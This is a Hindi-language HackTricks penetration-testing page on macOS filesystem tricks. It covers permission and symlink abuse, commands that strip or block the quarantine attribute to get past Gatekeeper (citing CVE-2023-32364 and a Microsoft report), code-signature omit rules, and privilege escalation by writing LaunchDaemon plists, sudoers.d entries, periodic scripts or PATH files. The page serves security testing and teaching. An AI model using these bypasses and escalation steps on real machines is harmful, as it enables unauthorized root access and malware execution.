# macOS FS ट्रिक्स

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँचना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) या **Twitter पर** मुझे **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, [**hacktricks repo**](https://github.com/carlospolop/hacktricks) और [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके.**

</details>

## POSIX अनुमतियों के संयोजन

**डायरेक्टरी** में अनुमतियाँ:

* **read** - आप **डायरेक्टरी प्रविष्टियों** को **गिन** सकते हैं
* **write** - आप **फाइलों** को **हटा/लिख** सकते हैं और **खाली फोल्डर्स** को हटा सकते हैं।
* लेकिन आप **गैर-खाली फोल्डर्स को हटा/संशोधित नहीं कर सकते** जब तक कि आपके पास उस पर लिखने की अनुमति न हो।
* आप **फोल्डर का नाम संशोधित नहीं कर सकते** जब तक कि आप उसके मालिक न हों।
* **execute** - आपको **डायरेक्टरी से गुजरने की अनुमति है** - अगर आपके पास यह अधिकार नहीं है, तो आप उसके अंदर की किसी भी फाइल या किसी उप-डायरेक्टरी की फाइलों तक पहुँच नहीं सकते।

### खतरनाक संयोजन

**रूट के स्वामित्व वाली फाइल/फोल्डर को कैसे ओवरराइट करें**, लेकिन:

* पथ में एक माता-पिता **डायरेक्टरी मालिक** उपयोगकर्ता है
* पथ में एक माता-पिता **डायरेक्टरी मालिक** एक **उपयोगकर्ता समूह** है जिसके पास **लिखने की पहुँच** है
* एक उपयोगकर्ता **समूह** के पास **फाइल** पर **लिखने की पहुँच** है

पिछले किसी भी संयोजन के साथ, एक हमलावर **सिम/हार्ड लिंक** को अपेक्षित पथ पर **इंजेक्ट** कर सकता है ताकि विशेषाधिकार प्राप्त मनमानी लेखन प्राप्त कर सके।

### फोल्डर रूट R+X विशेष मामला

अगर किसी **डायरेक्टरी** में फाइलें हैं जहाँ **केवल रूट के पास R+X पहुँच** है, तो वे **किसी और के लिए सुलभ नहीं हैं**। इसलिए एक भेद्यता जो **उपयोगकर्ता द्वारा पढ़ी जा सकने वाली फाइल को हिलाने की अनुमति देती है**, जिसे उस **प्रतिबंध** के कारण पढ़ा नहीं जा सकता, उस फोल्डर से **एक अलग फोल्डर में**, उन फाइलों को पढ़ने के लिए दुरुपयोग किया जा सकता है।

उदाहरण: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## सिम्बोलिक लिंक / हार्ड लिंक

अगर कोई विशेषाधिकार प्राप्त प्रक्रिया **फाइल** में डेटा लिख रही है जिसे **निम्न विशेषाधिकार वाले उपयोगकर्ता द्वारा नियंत्रित** किया जा सकता है, या जो **पहले से निम्न विशेषाधिकार वाले उपयोगकर्ता द्वारा बनाई गई** हो सकती है। उपयोगकर्ता बस उसे एक सिम्बोलिक या हार्ड लिंक के माध्यम से **दूसरी फाइल की ओर इशारा कर सकता है**, और विशेषाधिकार प्राप्त प्रक्रिया उस फाइल पर लिखेगी।

अन्य अनुभागों में जांचें जहाँ एक हमलावर **मनमानी लेखन का दुरुपयोग करके विशेषाधिकार बढ़ा सकता है**।

## .fileloc

**`.fileloc`** एक्सटेंशन वाली फाइलें अन्य एप्लिकेशनों या बाइनरीज़ की ओर इशारा कर सकती हैं ताकि जब वे खुलें, तो एप्लिकेशन/बाइनरी वही होगी जो निष्पादित की जाएगी।\
उदाहरण:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## मनमाना FD

यदि आप किसी **प्रक्रिया को उच्च विशेषाधिकारों वाली फ़ाइल या फ़ोल्डर खोलने के लिए प्रेरित कर सकते हैं**, तो आप **`crontab`** का दुरुपयोग करके `/etc/sudoers.d` में एक फ़ाइल को **`EDITOR=exploit.py`** के साथ खोल सकते हैं, ताकि `exploit.py` को `/etc/sudoers` के अंदर फ़ाइल के लिए FD मिल जाए और इसका दुरुपयोग कर सके।

उदाहरण के लिए: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## क्वारंटाइन xattrs चालों से बचें

### इसे हटा दें
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable ध्वज

यदि किसी फ़ाइल/फ़ोल्डर में यह अचल गुण है तो उस पर xattr लगाना संभव नहीं होगा
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs माउंट

एक **devfs** माउंट **xattr का समर्थन नहीं करता है**, अधिक जानकारी के लिए [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html) देखें।
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

यह ACL फाइल में `xattrs` जोड़ने से रोकता है
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** फ़ाइल प्रारूप एक फ़ाइल की प्रतिलिपि उसके ACEs सहित बनाता है।

[**सोर्स कोड**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) में यह देखा जा सकता है कि xattr के अंदर संग्रहीत ACL पाठ प्रतिनिधित्व **`com.apple.acl.text`** को डिकंप्रेस्ड फ़ाइल में ACL के रूप में सेट किया जाएगा। इसलिए, यदि आपने एक एप्लिकेशन को **AppleDouble** फ़ाइल प्रारूप में एक zip फ़ाइल में संपीड़ित किया है जिसमें एक ACL है जो अन्य xattrs को उस पर लिखने से रोकता है... तो एप्लिकेशन में quarantine xattr सेट नहीं किया गया था:

अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) देखें।

इसे दोहराने के लिए हमें पहले सही acl स्ट्रिंग प्राप्त करने की आवश्यकता है:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

यह वास्तव में आवश्यक नहीं है लेकिन मैं इसे यहाँ छोड़ देता हूँ, जस्ट इन केस:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Bypass Code Signatures

Bundles में **`_CodeSignature/CodeResources`** नामक फाइल होती है जिसमें **bundle** की प्रत्येक **फाइल** का **hash** होता है। ध्यान दें कि CodeResources का hash भी **executable** में **embedded** होता है, इसलिए हम उसके साथ भी छेड़छाड़ नहीं कर सकते।

हालांकि, कुछ फाइलें होती हैं जिनके सिग्नेचर की जांच नहीं की जाती, इनमें plist में omit कीवर्ड होता है, जैसे:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
संसाधन के हस्ताक्षर की गणना cli के साथ की जा सकती है:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
{% endcode %}

## माउंट dmgs

एक उपयोगकर्ता कुछ मौजूदा फोल्डर्स के ऊपर भी एक कस्टम dmg बना सकता है। यह आप कैसे एक कस्टम dmg पैकेज कस्टम सामग्री के साथ बना सकते हैं:

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## मनमाने लेखन

### आवधिक sh स्क्रिप्ट्स

यदि आपकी स्क्रिप्ट को **शेल स्क्रिप्ट** के रूप में व्याख्या किया जा सकता है, तो आप **`/etc/periodic/daily/999.local`** शेल स्क्रिप्ट को ओवरराइट कर सकते हैं जो हर दिन ट्रिगर की जाएगी।

आप इस स्क्रिप्ट का **नकली** निष्पादन इसके साथ कर सकते हैं: **`sudo periodic daily`**

### डेमन्स

मनमाने **LaunchDaemon** जैसे **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** को लिखें जिसमें एक plist एक मनमाने स्क्रिप्ट को निष्पादित करता है जैसे:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
```markdown
स्क्रिप्ट `/Applications/Scripts/privesc.sh` बनाएं जिसमें आप जो **कमांड्स** रूट के रूप में चलाना चाहते हैं, वो शामिल हों।

### Sudoers फ़ाइल

यदि आपके पास **मनमानी लिखने की क्षमता** है, तो आप **`/etc/sudoers.d/`** फोल्डर के अंदर एक फ़ाइल बना सकते हैं जो आपको **sudo** विशेषाधिकार प्रदान करती है।

### PATH फ़ाइलें

**`/etc/paths`** फ़ाइल PATH env वेरिएबल को पॉपुलेट करने वाले मुख्य स्थानों में से एक है। इसे ओवरराइट करने के लिए आपको रूट होना चाहिए, लेकिन यदि कोई **विशेषाधिकार प्राप्त प्रक्रिया** से स्क्रिप्ट किसी **कमांड को पूर्ण पथ के बिना** निष्पादित कर रही है, तो आप इस फ़ाइल को संशोधित करके उसे **हाइजैक** कर सकते हैं।

&#x20;आप **`/etc/paths.d`** में भी फ़ाइलें लिख सकते हैं ताकि `PATH` env वेरिएबल में नए फोल्डर्स लोड किए जा सकें।

## संदर्भ

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबरसिक्योरिटी कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का विज्ञापन HackTricks में** देखना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँच चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह।
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें।
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) में शामिल हों या [**telegram समूह**](https://t.me/peass) में या **Twitter** पर मुझे **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**।**
* अपनी हैकिंग ट्रिक्स साझा करें, [**hacktricks repo**](https://github.com/carlospolop/hacktricks) और [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके।

</details>
```
